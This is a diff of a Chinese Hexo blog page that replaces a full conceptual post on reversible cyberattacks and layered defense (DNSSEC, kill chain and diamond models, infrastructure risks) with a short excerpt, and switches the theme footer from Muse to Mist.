-<h4 id="锁定系统"><a href="#锁定系统" class="headerlink" title="锁定系统"></a>锁定系统</h4><p>使用仅由攻击者拥有的密钥加密来受害者的计算机操作系统以达到“锁定”效果</p>
-<h4 id="混淆数据"><a href="#混淆数据" class="headerlink" title="混淆数据:"></a>混淆数据:</h4><p>使用难以破译的算法或可逆的数据操作以混淆受害者的数据</p>
-<h4 id="拦截信息"><a href="#拦截信息" class="headerlink" title="拦截信息:"></a>拦截信息:</h4><p>拦截或扣留对受害者重要的关键信息，同时将其保存在备份中</p>
-<h4 id="拒绝服务"><a href="#拒绝服务" class="headerlink" title="拒绝服务:"></a>拒绝服务:</h4><p>欺骗受害者使得他们认为系统实际上是不可操作的。</p>
-<h3 id="网络空间四大基础应用"><a href="#网络空间四大基础应用" class="headerlink" title="网络空间四大基础应用"></a>网络空间四大基础应用</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-14.png" alt="图-14"></p>
-<h3 id="APT攻击路径繁多载体多样"><a href="#APT攻击路径繁多载体多样" class="headerlink" title="APT攻击路径繁多载体多样"></a>APT攻击路径繁多载体多样</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-15.png" alt="图-15"></p>
-<h2 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h2><h3 id="根域名服务器"><a href="#根域名服务器" class="headerlink" title="根域名服务器"></a>根域名服务器</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-16.png" alt="图-16"></p>
-<p>根域名服务器是互联网域名解析系统（DNS）中最高级别的域名服务器，负责返回顶级域的权威域名服务器地址。所有的域名解析操作都离不开它们，它们是互联网基础设施中的重要部分。根域名服务器地址的数量被限制为13个。</p>
-<h3 id="域名解析服务安全性改进"><a href="#域名解析服务安全性改进" class="headerlink" title="域名解析服务安全性改进"></a>域名解析服务安全性改进</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-17.png" alt="图-17"></p>
-<p>DNS 安全扩展 (DNS Security Extensions, DNSSEC)</p>
-<p>通过对数据进行数字“签名”来抵御DNS劫持攻击，从而确信数据有效。</p>
-<p>为了从互联网中消除该攻击，必须在从根区域到最终域名（例如， <a href="http://www.h3c.com）的查找过程中的每一步部署该项技术。对根区域进行签名（在根区域部署" target="_blank" rel="noopener">www.h3c.com）的查找过程中的每一步部署该项技术。对根区域进行签名（在根区域部署</a> DNSSEC ）是整个过程中的必要步骤。</p>
-<p>该技术并不对数据进行加密，只是验证所访问的站点地址是否有效。</p>
-<p>2015年6月23日国际互联网名称与数字地址分配机构（ICANN）正式对外发布雪人计划 (Yeti DNS Project)。</p>
-<p>截至2017年11月27日，“雪人计划”已完成全球25台IPv6根服务器架设，其中中国部署4台。</p>
-<h3 id="关键基础设施"><a href="#关键基础设施" class="headerlink" title="关键基础设施"></a>关键基础设施</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-18.png" alt="图-18"></p>
-<h3 id="暴露在-Internet-上的工控设备"><a href="#暴露在-Internet-上的工控设备" class="headerlink" title="暴露在 Internet 上的工控设备"></a>暴露在 Internet 上的工控设备</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-19.png" alt="图-19"></p>
-<h3 id="基础设施脆弱点"><a href="#基础设施脆弱点" class="headerlink" title="基础设施脆弱点"></a>基础设施脆弱点</h3><h4 id="供应链"><a href="#供应链" class="headerlink" title="供应链"></a>供应链</h4><p>系统软硬件设备多种多样，来自系统内外、国内外的供应商，设备存在被预装恶意软件的风险，受攻击后，可能造成局部或系统性安全事故。</p>
-<h4 id="终端"><a href="#终端" class="headerlink" title="终端"></a>终端</h4><p>终端设备或系统的运营主体繁多、应用场景复杂，这都增加了其被恶意渗透或监听、控制的风险。</p>
-<h4 id="通信网络"><a href="#通信网络" class="headerlink" title="通信网络"></a>通信网络</h4><p>存在假冒终端、非授权人员非法接入、窃取信息的风险，导致通信网络设备运行异常或者中断。</p>
-<h4 id="应用系统"><a href="#应用系统" class="headerlink" title="应用系统"></a>应用系统</h4><p>存在恶意病毒入侵的可能，导致服务异常或中断，甚至破坏应用系统的软硬件设备。</p>
-<h3 id="异构冗余"><a href="#异构冗余" class="headerlink" title="异构冗余"></a>异构冗余</h3><p>控制芯片、精密的数控机床和工业控制器行业无法自主可控的使用异构冗余保证安全可靠。<br>这种“异构冗余”系统的实质就是：在一堆不可靠的部件之上，构建出一个相对可靠的体系。</p>
-<p>同一个生产流程，采用多套预备系统，分别采用不同国家的控制器，不同的操作系统、不同的软件逻辑。在这种情况下，机器的每一个动作都需要三套控制系统进行表决，如果有一套系统被攻击，给出异常的数据，那么它就会被表决踢出局。</p>
-<p>即使出现极端的情况：三个系统都遭到攻击，产生的结果全不一致，此时会自动调用备用系统。备用系统可以是一套隐藏系统，平时处于静默状态。攻击者根本感觉不到这套备用系统的存在，从而无法预先进行攻击。</p>
-<p>缺点: 投资巨大</p>
-<h3 id="可逆的-Satan-勒索软件"><a href="#可逆的-Satan-勒索软件" class="headerlink" title="可逆的 Satan 勒索软件"></a>可逆的 Satan 勒索软件</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-20.png" alt="图-20"></p>
-<h3 id="20-个重要管控"><a href="#20-个重要管控" class="headerlink" title="20 个重要管控"></a>20 个重要管控</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-21.png" alt="图-21"></p>
-<h3 id="攻击链模型"><a href="#攻击链模型" class="headerlink" title="攻击链模型"></a>攻击链模型</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-22.png" alt="图-22"></p>
-<h3 id="入侵分析钻石扩展模型"><a href="#入侵分析钻石扩展模型" class="headerlink" title="入侵分析钻石扩展模型"></a>入侵分析钻石扩展模型</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-23.png" alt="图-23"></p>
-<p>2013年塞尔吉奥 卡尔塔吉罗(Sergio Caltagirone）提出的入侵分析钻石模型</p>
-<h3 id="以受害者为中心的分析方法"><a href="#以受害者为中心的分析方法" class="headerlink" title="以受害者为中心的分析方法"></a>以受害者为中心的分析方法</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-24.png" alt="图-24"></p>
-<p>大多数组织，执行的网络上和主机内的检测和防御行为，属于以受害者为中心的方法。</p>
-<h3 id="使用攻击链与钻石模型复现分析攻击"><a href="#使用攻击链与钻石模型复现分析攻击" class="headerlink" title="使用攻击链与钻石模型复现分析攻击"></a>使用攻击链与钻石模型复现分析攻击</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-25.png" alt="图-25"></p>
-<ol>
-<li>攻击者使用扫描技术发现一个受害者IP地址；</li>
-<li>攻击者向受害者IP地址投递攻击载荷；</li>
-<li>受害者设备触发攻击载荷；</li>
-<li>攻击载荷连接C&amp;C服务器；</li>
-<li>C&amp;C服务器下发指令；</li>
-<li>受害者设备被用于横向扫描;</li>
-<li>受害者设备被当做跳板肉鸡向外投递攻击载荷。</li>
-</ol>
-<h3 id="使用威胁指示器防御攻击"><a href="#使用威胁指示器防御攻击" class="headerlink" title="使用威胁指示器防御攻击"></a>使用威胁指示器防御攻击</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-26.png" alt="图-26"></p>
-
+          <p>在2018年10月某安全会议中，stxletto做了《可逆性网络攻击与防御》的主题分享，本主题在特朗普废止PPD-20并签署新的美国国家网络战略的时代背景下，从已经发生的网络攻击实际案例中揭示可逆性攻击的趋势、梳理总结网络攻击发起方式。以安全三要素为支点，介绍赛博空间的三类威胁，总结四种潜在的可逆性攻击形式及四大基础应用，最后结合经典的攻击链模型钻石模型，和安全从业者们共同解读一个实际案例中的深度分层体系防御方案。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1477,7 +652,7 @@
   </span>
   <span class="author" itemprop="copyrightHolder">stxletto</span>
 </div>
-  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
   </div>
 
         
